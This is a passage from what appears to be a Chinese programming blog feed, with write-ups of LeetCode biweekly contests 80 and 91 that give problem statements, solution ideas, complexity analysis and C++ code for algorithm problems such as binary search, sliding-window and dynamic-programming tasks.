<p>同时给你一个整数 <code>success</code> 。一个咒语和药水的能量强度 相乘 如果 大于等于 <code>success</code> ，那么它们视为一对 成功 的组合。</p>
<p>请你返回一个长度为 <code>n</code> 的整数数组 <code>pairs</code>，其中 <code>pairs[i]</code> 是能跟第 <code>i</code> 个咒语成功组合的 药水 数目。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：spells = [5,1,3], potions = [1,2,3,4,5], success = 7</span><br><span class="line">输出：[4,0,3]</span><br><span class="line">解释：</span><br><span class="line">- 第 0 个咒语：5 * [1,2,3,4,5] = [5,10,15,20,25] 。总共 4 个成功组合。</span><br><span class="line">- 第 1 个咒语：1 * [1,2,3,4,5] = [1,2,3,4,5] 。总共 0 个成功组合。</span><br><span class="line">- 第 2 个咒语：3 * [1,2,3,4,5] = [3,6,9,12,15] 。总共 3 个成功组合。</span><br><span class="line">所以返回 [4,0,3] 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：spells = [3,1,2], potions = [8,5,8], success = 16</span><br><span class="line">输出：[2,0,2]</span><br><span class="line">解释：</span><br><span class="line">- 第 0 个咒语：3 * [8,5,8] = [24,15,24] 。总共 2 个成功组合。</span><br><span class="line">- 第 1 个咒语：1 * [8,5,8] = [8,5,8] 。总共 0 个成功组合。</span><br><span class="line">- 第 2 个咒语：2 * [8,5,8] = [16,10,16] 。总共 2 个成功组合。</span><br><span class="line">所以返回 [2,0,2] 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == spells.length</code></li>
<li><code>m == potions.length</code></li>
<li><code>1 &lt;= n, m &lt;= 105</code></li>
<li><code>1 &lt;= spells[i], potions[i] &lt;= 105</code></li>
<li><code>1 &lt;= success &lt;= 1010</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-80/problems/successful-pairs-of-spells-and-potions/">https://leetcode.cn/contest/biweekly-contest-80/problems/successful-pairs-of-spells-and-potions/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>二分查找
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接对<code>potions</code>进行排序，每次遍历 $\textit{spells}[i]$, 找到 $\textit{potions}$ 中所有大于等于 $\lceil \dfrac{success}{spells} \rceil$ 的数目即可，我们可以用二分查找完成即可 。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O((m + n) \times \log n)$，其中 $m$ 为数组 $\textit{spells}$ 的长度，其中 $n$ 为数组 $\textit{potions}$ 的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">successfulPairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; spells, vector&lt;<span class="type">int</span>&gt;&amp; potions, <span class="type">long</span> <span class="type">long</span> success)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="built_in">sort</span>(potions.<span class="built_in">begin</span>(), potions.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x : spells) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> curr =  (success + x - <span class="number">1</span>) / x;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> y = potions.<span class="built_in">end</span>() - <span class="built_in">lower_bound</span>(potions.<span class="built_in">begin</span>(), potions.<span class="built_in">end</span>(), curr);</span><br><span class="line">            ans.<span class="built_in">emplace_back</span>(y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6097-替换字符后匹配"><a href="#6097-替换字符后匹配" class="headerlink" title="6097. 替换字符后匹配"></a>6097. 替换字符后匹配</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你两个字符串 <code>s</code> 和 <code>sub</code> 。同时给你一个二维字符数组 <code>mappings</code> ，其中 <code>mappings[i] = [oldi, newi]</code> 表示你可以替换 <code>sub</code> 中任意数目的 <code>oldi</code> 个字符，替换成 <code>newi</code> 。<code>sub</code> 中每个字符 不能 被替换超过一次。</p>
<p>如果使用 <code>mappings</code> 替换 <code>0</code> 个或者若干个字符，可以将 <code>sub</code> 变成 <code>s</code> 的一个子字符串，请你返回 <code>true</code>，否则返回 <code>false</code> 。<br>一个 子字符串 是字符串中连续非空的字符序列。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;fool3e7bar&quot;, sub = &quot;leet&quot;, mappings = [[&quot;e&quot;,&quot;3&quot;],[&quot;t&quot;,&quot;7&quot;],[&quot;t&quot;,&quot;8&quot;]]</span><br><span class="line">输出：true</span><br><span class="line">解释：将 sub 中第一个 &#x27;e&#x27; 用 &#x27;3&#x27; 替换，将 &#x27;t&#x27; 用 &#x27;7&#x27; 替换。</span><br><span class="line">现在 sub = &quot;l3e7&quot; ，它是 s 的子字符串，所以我们返回 true 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;fooleetbar&quot;, sub = &quot;f00l&quot;, mappings = [[&quot;o&quot;,&quot;0&quot;]]</span><br><span class="line">输出：false</span><br><span class="line">解释：字符串 &quot;f00l&quot; 不是 s 的子串且没有可以进行的修改。</span><br><span class="line">注意我们不能用 &#x27;o&#x27; 替换 &#x27;0&#x27; 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;Fool33tbaR&quot;, sub = &quot;leetd&quot;, mappings = [[&quot;e&quot;,&quot;3&quot;],[&quot;t&quot;,&quot;7&quot;],[&quot;t&quot;,&quot;8&quot;],[&quot;d&quot;,&quot;b&quot;],[&quot;p&quot;,&quot;b&quot;]]</span><br><span class="line">输出：true</span><br><span class="line">解释：将 sub 里第一个和第二个 &#x27;e&#x27; 用 &#x27;3&#x27; 替换，用 &#x27;b&#x27; 替换 sub 里的 &#x27;d&#x27; 。</span><br><span class="line">得到 sub = &quot;l33tb&quot; ，它是 s 的子字符串，所以我们返回 true 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= sub.length &lt;= s.length &lt;= 5000</code></li>
<li><code>0 &lt;= mappings.length &lt;= 1000</code></li>
<li><code>mappings[i].length == 2</code></li>
<li><code>oldi != newi</code></li>
<li><code>s</code> 和 <code>sub</code> 只包含大写和小写英文字母和数字。</li>
<li><code>oldi</code> 和 <code>newi</code> 是大写、小写字母或者是个数字。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-80/problems/match-substring-after-replacement/">https://leetcode.cn/contest/biweekly-contest-80/problems/match-substring-after-replacement/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>暴力循环
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>想了半天没有想到这个题目有什么好的解法，只能每次遍历所有可能的组合，遍历两个字符串中所有的组合，找到组合中的不同的字符变换，查找该字符映射是否能够完成即可，反正莫名其妙就过了，感觉解法应该不对，时间复杂度应该不需要这么高。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m \times n)$, 其中 $m,n$ 为字符串 $s, \textit{sub}$ 的长度。</li>
<li>空间复杂度：$O(k)$，其中 $k$ 为 $\textit{mappings}$ 的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">matchReplacement</span><span class="params">(string s, string sub, vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; mappings)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = sub.<span class="built_in">size</span>();</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp; v : mappings) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(v[<span class="number">0</span>] * <span class="number">256</span> + v[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">bool</span> valid = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="type">int</span> x = n - <span class="number">1</span> - j;</span><br><span class="line">                <span class="keyword">if</span> (s[i-x] != sub[j]) &#123;</span><br><span class="line">                    <span class="type">int</span> y = sub[j] * <span class="number">256</span> + s[i-x];</span><br><span class="line">                    <span class="keyword">if</span> (!cnt.<span class="built_in">count</span>(y))&#123;</span><br><span class="line">                        valid = <span class="literal">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(valid)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6098-统计得分小于-K-的子数组数目"><a href="#6098-统计得分小于-K-的子数组数目" class="headerlink" title="6098. 统计得分小于 K 的子数组数目"></a>6098. 统计得分小于 K 的子数组数目</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>一个数字的 分数 定义为数组之和 乘以 数组的长度。</p>
<ul>
<li>比方说，<code>[1, 2, 3, 4, 5]</code> 的分数为 <code>(1 + 2 + 3 + 4 + 5) * 5 = 75 </code>。<br>给你一个正整数数组 <code>nums</code> 和一个整数 <code>k</code> ，请你返回 <code>nums</code> 中分数 严格小于 <code>k</code> 的 非空整数子数组数目。</li>
</ul>
<p>子数组 是数组中的一个连续元素序列。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,1,4,3,5], k = 10</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">有 6 个子数组的分数小于 10 ：</span><br><span class="line">- [2] 分数为 2 * 1 = 2 。</span><br><span class="line">- [1] 分数为 1 * 1 = 1 。</span><br><span class="line">- [4] 分数为 4 * 1 = 4 。</span><br><span class="line">- [3] 分数为 3 * 1 = 3 。 </span><br><span class="line">- [5] 分数为 5 * 1 = 5 。</span><br><span class="line">- [2,1] 分数为 (2 + 1) * 2 = 6 。</span><br><span class="line">注意，子数组 [1,4] 和 [4,3,5] 不符合要求，因为它们的分数分别为 10 和 36，但我们要求子数组的分数严格小于 10 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,1,1], k = 5</span><br><span class="line">输出：5</span><br><span class="line">解释：</span><br><span class="line">除了 [1,1,1] 以外每个子数组分数都小于 5 。</span><br><span class="line">[1,1,1] 分数为 (1 + 1 + 1) * 3 = 9 ，大于 5 。</span><br><span class="line">所以总共有 5 个子数组得分小于 5 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 105</code></li>
<li><code>1 &lt;= k &lt;= 1015</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-80/problems/count-subarrays-with-score-less-than-k/">https://leetcode.cn/contest/biweekly-contest-80/problems/count-subarrays-with-score-less-than-k/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>二分查找
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目感觉只能算是中等难度题目，不晓得为啥是<code>hard</code>级别。我们可以每次枚举以 $nums[i]$ 为结尾的子数组所有构成的最长符合要求的子数组。我们用二分查找枚举子数组的起点 $j$，我们可以知道如果当 $(i - j + 1) * (sum[i] - sum[j - 1]) \ge k$ 时，此时则我们应当增加 $j$, 否则减少 $j$。知道我们找到最大的 $j$ 即可，此时满足要求的子数组一共有 $i - j + 1$ 个，我们依次求出符合满足每个元素构成的子数组的数目，然后累加即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$n \log n$，其中 $n$ 表示数组的长度。每次枚举时需要进行二分查找。</li>
<li>空间复杂度：$O(n)$, 其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">countSubarrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">long</span> <span class="type">long</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">sum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum[i + <span class="number">1</span>] = sum[i] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> l = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> r = i;</span><br><span class="line">            <span class="type">int</span> last = i;</span><br><span class="line">            <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">                <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> curr = (sum[i] - sum[mid]) * (i - mid);</span><br><span class="line">                <span class="keyword">if</span> (curr &gt;= k) &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>; </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    last = mid;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ans += i - last;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 91</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/80/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-91"><a href="#leetcode-biweekly-contest-91" class="headerlink" title="leetcode biweekly contest 91"></a>leetcode biweekly contest 91</h2><p>本周的双周赛题目确实不太难，最后一题的二分法确实存在问题，需要举例说明即可。</p>
<h3 id="6237-不同的平均值数目"><a href="#6237-不同的平均值数目" class="headerlink" title="6237. 不同的平均值数目"></a>6237. 不同的平均值数目</h3><p>给你一个下标从 <strong>0</strong> 开始长度为 <strong>偶数</strong> 的整数数组 <code>nums</code> 。</p>
<p>只要 <code>nums</code> <strong>不是</strong> 空数组，你就重复执行以下步骤：</p>
<ul>
<li>找到 <code>nums</code> 中的最小值，并删除它。</li>
<li>找到 <code>nums</code> 中的最大值，并删除它。</li>
<li>计算删除两数的平均值。</li>
</ul>
<p>两数 <code>a</code> 和 <code>b</code> 的 <strong>平均值</strong> 为 <code>(a + b) / 2</code> 。</p>
<ul>
<li>比方说，<code>2</code> 和 <code>3</code> 的平均值是 <code>(2 + 3) / 2 = 2.5</code> 。</li>
</ul>
<p>返回上述过程能得到的 <strong>不同</strong> 平均值的数目。</p>
<p><strong>注意</strong> ，如果最小值或者最大值有重复元素，可以删除任意一个。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,1,4,0,3,5]</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">1. 删除 0 和 5 ，平均值是 (0 + 5) / 2 = 2.5 ，现在 nums = [4,1,4,3] 。</span><br><span class="line">2. 删除 1 和 4 ，平均值是 (1 + 4) / 2 = 2.5 ，现在 nums = [4,3] 。</span><br><span class="line">3. 删除 3 和 4 ，平均值是 (3 + 4) / 2 = 3.5 。</span><br><span class="line">2.5 ，2.5 和 3.5 之中总共有 2 个不同的数，我们返回 2 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,100]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">删除 1 和 100 后只有一个平均值，所以我们返回 1 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 100</code></li>
<li><code>nums.length</code> 是偶数。</li>
<li><code>0 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-91/problems/number-of-distinct-averages/">https://leetcode.cn/contest/biweekly-contest-91/problems/number-of-distinct-averages/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>双指针
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>每次取出当前数组中的最大值与最小值，并求二者的平均数，最后用哈希表统计不同数目即可。我们可以先将数组排序 $l$ 指向当前数组的最小值， $r$ 指向当前数组的最大值，每次求完后对索引进行移动即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(\log n)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">distinctAverages</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="type">double</span>&gt; cnt;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = n - <span class="number">1</span>; i &lt; j; i++, j--) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(<span class="built_in">double</span>(nums[i] + nums[j]) / <span class="number">2.0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6238-统计构造好字符串的方案数"><a href="#6238-统计构造好字符串的方案数" class="headerlink" title="6238. 统计构造好字符串的方案数"></a>6238. 统计构造好字符串的方案数</h3><p>给你整数 <code>zero</code> ，<code>one</code> ，<code>low</code> 和 <code>high</code> ，我们从空字符串开始构造一个字符串，每一步执行下面操作中的一种：</p>
<ul>
<li>将 <code>&#39;0&#39;</code> 在字符串末尾添加 <code>zero</code> 次。</li>
<li>将 <code>&#39;1&#39;</code> 在字符串末尾添加 <code>one</code> 次。</li>
</ul>
<p>以上操作可以执行任意次。</p>
<p>如果通过以上过程得到一个 <strong>长度</strong> 在 <code>low</code> 和 <code>high</code> 之间（包含上下边界）的字符串，那么这个字符串我们称为 <strong>好</strong> 字符串。</p>
<p>请你返回满足以上要求的 <strong>不同</strong> 好字符串数目。由于答案可能很大，请将结果对 <code>109 + 7</code> <strong>取余</strong> 后返回。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：low = 3, high = 3, zero = 1, one = 1</span><br><span class="line">输出：8</span><br><span class="line">解释：</span><br><span class="line">一个可能的好字符串是 &quot;011&quot; 。</span><br><span class="line">可以这样构造得到：&quot;&quot; -&gt; &quot;0&quot; -&gt; &quot;01&quot; -&gt; &quot;011&quot; 。</span><br><span class="line">从 &quot;000&quot; 到 &quot;111&quot; 之间所有的二进制字符串都是好字符串。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：low = 2, high = 3, zero = 1, one = 2</span><br><span class="line">输出：5</span><br><span class="line">解释：好字符串为 &quot;00&quot; ，&quot;11&quot; ，&quot;000&quot; ，&quot;110&quot; 和 &quot;011&quot; 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= low &lt;= high &lt;= 105</code></li>
<li><code>1 &lt;= zero, one &lt;= low</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-91/problems/count-ways-to-build-good-strings/">https://leetcode.cn/contest/biweekly-contest-91/problems/count-ways-to-build-good-strings/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>非常简单的动态规划，类似于青蛙跳格子或者上楼梯类似的动态规划，在这里对于第 $i$ 个格子有两种路径可以选择要么选择 $zero$，要么选择 $one$。<br>$$<br>dp[i] &#x3D; dp[i - one] + dp[i - zero]<br>$$</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$。</li>
<li>空间复杂度：空间复杂度为 $O(n)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countGoodStrings</span><span class="params">(<span class="type">int</span> low, <span class="type">int</span> high, <span class="type">int</span> zero, <span class="type">int</span> one)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(high + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= high; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= zero) &#123;</span><br><span class="line">                dp[i] = (dp[i] + dp[i - zero]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= one) &#123;</span><br><span class="line">                 dp[i] = (dp[i] + dp[i - one]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = low; i &lt;= high; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[i] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                ans = (ans + dp[i]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6240-树上最大得分和路径"><a href="#6240-树上最大得分和路径" class="headerlink" title="6240. 树上最大得分和路径"></a>6240. 树上最大得分和路径</h3><p>一个 <code>n</code> 个节点的无向树，节点编号为 <code>0</code> 到 <code>n - 1</code> ，树的根结点是 <code>0</code> 号节点。给你一个长度为 <code>n - 1</code> 的二维整数数组 <code>edges</code> ，其中 <code>edges[i] = [ai, bi]</code> ，表示节点 <code>ai</code> 和 <code>bi</code> 在树中有一条边。</p>
<p>在每一个节点 <code>i</code> 处有一扇门。同时给你一个都是偶数的数组 <code>amount</code> ，其中 <code>amount[i]</code> 表示：</p>
<ul>
<li>如果 <code>amount[i]</code> 的值是负数，那么它表示打开节点 <code>i</code> 处门扣除的分数。</li>
<li>如果 <code>amount[i]</code> 的值是正数，那么它表示打开节点 <code>i</code> 处门加上的分数。</li>
</ul>
<p>游戏按照如下规则进行：</p>
<ul>
<li><p>一开始，Alice 在节点 <code>0</code> 处，Bob 在节点 <code>bob</code> 处。</p>
</li>
<li><p>每一秒钟，Alice 和 Bob <strong>分别</strong> 移动到相邻的节点。Alice 朝着某个 <strong>叶子结点</strong> 移动，Bob 朝着节点 <code>0</code> 移动。</p>
</li>
<li><p>对于他们之间路径上的</p>
<p>每一个</p>
<p> 节点，Alice 和 Bob 要么打开门并扣分，要么打开门并加分。注意：</p>
<ul>
<li>如果门 <strong>已经打开</strong> （被另一个人打开），不会有额外加分也不会扣分。</li>
<li>如果 Alice 和 Bob <strong>同时</strong> 到达一个节点，他们会共享这个节点的加分或者扣分。换言之，如果打开这扇门扣 <code>c</code> 分，那么 Alice 和 Bob 分别扣 <code>c / 2</code> 分。如果这扇门的加分为 <code>c</code> ，那么他们分别加 <code>c / 2</code> 分。</li>
</ul>
</li>
<li><p>如果 Alice 到达了一个叶子结点，她会停止移动。类似的，如果 Bob 到达了节点 <code>0</code> ，他也会停止移动。注意这些事件互相 <strong>独立</strong> ，不会影响另一方移动。</p>
</li>
</ul>
<p>请你返回 Alice 朝最优叶子结点移动的 <strong>最大</strong> 净得分。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/29/eg1.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：edges = [[0,1],[1,2],[1,3],[3,4]], bob = 3, amount = [-2,4,2,-4,6]</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">上图展示了输入给出的一棵树。游戏进行如下：</span><br><span class="line">- Alice 一开始在节点 0 处，Bob 在节点 3 处。他们分别打开所在节点的门。</span><br><span class="line">  Alice 得分为 -2 。</span><br><span class="line">- Alice 和 Bob 都移动到节点 1 。</span><br><span class="line">  因为他们同时到达这个节点，他们一起打开门并平分得分。</span><br><span class="line">  Alice 的得分变为 -2 + (4 / 2) = 0 。</span><br><span class="line">- Alice 移动到节点 3 。因为 Bob 已经打开了这扇门，Alice 得分不变。</span><br><span class="line">  Bob 移动到节点 0 ，并停止移动。</span><br><span class="line">- Alice 移动到节点 4 并打开这个节点的门，她得分变为 0 + 6 = 6 。</span><br><span class="line">现在，Alice 和 Bob 都不能进行任何移动了，所以游戏结束。</span><br><span class="line">Alice 无法得到更高分数。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/29/eg2.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：edges = [[0,1]], bob = 1, amount = [-7280,2350]</span><br><span class="line">输出：-7280</span><br><span class="line">解释：</span><br><span class="line">Alice 按照路径 0-&gt;1 移动，同时 Bob 按照路径 1-&gt;0 移动。</span><br><span class="line">所以 Alice 只打开节点 0 处的门，她的得分为 -7280 。</span><br></pre></td></tr></table></figure>

